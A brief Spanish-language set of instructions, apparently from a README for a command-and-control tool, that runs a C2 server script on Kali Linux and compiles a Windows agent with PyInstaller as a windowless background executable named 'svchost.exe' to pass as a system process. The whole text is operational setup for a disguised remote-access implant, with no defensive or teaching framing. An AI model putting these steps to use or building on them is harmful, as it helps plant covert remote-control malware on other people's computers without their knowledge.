En KALI:

1. Ejecutar C2
python3 c2_jdexploit.py

2. Si no tienes python3:
python c2_jdexploit.py

1. En WINDOWS - Compilar y ejecutar:
powershell
# Compilar AGENTE en background
python -m PyInstaller --onefile --noconsole --name "svchost.exe" windows_agent_background.py

# Ejecutar (se ejecutará en background automáticamente)
.\dist\svchost.exe
